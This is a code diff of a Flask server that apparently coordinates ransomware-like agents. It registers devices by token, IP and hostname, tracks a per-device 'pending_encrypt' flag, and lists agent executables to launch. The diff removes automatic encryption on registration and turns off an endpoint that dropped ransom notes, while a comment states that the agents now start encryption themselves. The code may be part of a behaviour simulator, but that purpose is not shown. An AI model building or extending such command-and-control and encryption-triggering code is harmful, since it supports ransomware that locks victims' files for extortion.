@@ -44,11 +44,15 @@ DEVICES = {}
 SCRIPTS = {
     'scriptA': {
         'label': 'Script A (agent_sync from Downloads)',
-        'command': 'python "C:\\Users\\user\\Downloads\\sample\\py_simple\\agent_sync.py" --auto-encrypt'
+        'command': 'python "C:\\Users\\user\\Downloads\\sample\\py_simple\\agent_sync.py"'
     },
     'scriptB': {
         'label': 'Script B (c sample)',
         'command': 'python C:\\Users\\user\\c\\device_client.py'
+    },
+    'rusty': {
+        'label': 'Rusty (release exe in target\\release)',
+        'command': '"C:\\Users\\user\\Downloads\\sample\\rusty\\target\\release\\rusty.exe"'
     }
 }
 behavior = BehaviorSimulator(processor.work_directory)
@@ -495,7 +499,6 @@ def publickey_register():
         requester_ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
         data = request.get_json(silent=True) or {}
         provided_hostname = data.get('hostname')
-        request_auto = bool((data or {}).get('auto_encrypt'))
 
         # Reuse an existing token for the same host to avoid duplicates in UI
         token = None
@@ -507,14 +510,12 @@ def publickey_register():
         if not token:
             import secrets
             token = secrets.token_hex(16)
-            auto = request_auto or ((os.getenv('AUTO_ENCRYPT_ON_AUTH') or '0').strip().lower() in ('1','true','yes','on'))
-            DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': bool(auto) }
+            # Agent now self-initiates encryption; do not auto-pend on auth
+            DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': False }
         # Always keep latest meta
         DEVICES[token]['ip'] = requester_ip
         DEVICES[token]['hostname'] = provided_hostname
-        # If auto requested on an existing token, mark pending
-        if request_auto:
-            DEVICES[token]['pending_encrypt'] = True
+        # Do not set pending_encrypt automatically; actions are initiated by the agent or UI
 
         record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
         try:
@@ -754,8 +755,8 @@ def set_device_keys_prefixed(token: str):
 
 @app.route('/behavior/notes', methods=['POST'])
 def behavior_notes():
-    files = behavior.drop_ransom_notes()
-    return jsonify({'status': 'ok', 'files': files})
+    # Disabled: do not create ransom note files
+    return jsonify({'status': 'disabled', 'files': []})
 
 @app.route('/py_simple/behavior/notes', methods=['POST'])
 def behavior_notes_prefixed():
